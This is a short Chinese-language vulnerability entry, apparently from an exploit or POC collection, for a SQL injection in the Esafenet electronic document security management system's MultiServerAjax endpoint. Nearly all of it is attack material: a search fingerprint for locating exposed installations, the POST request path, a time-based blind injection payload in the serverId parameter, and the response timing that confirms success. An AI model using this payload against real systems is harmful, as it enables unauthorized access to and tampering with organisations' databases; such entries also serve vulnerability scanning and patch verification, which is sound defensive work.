# 亿赛通电子文档安全管理系统MultiServerAjax存在SQL注入漏洞

亿赛通电子文档安全管理系统 ｜ SQL注入 ｜ —
- **指纹**：`app="亿赛通-DLP"`
- **请求**：`POST /CDGServer3/js/../MultiServerAjax HTTP/1.1`

**Payload**
```
command=delServer&serverId=-1'waitfor delay '0:0:5'--
```
- **响应特征**：200 响应时间>=5s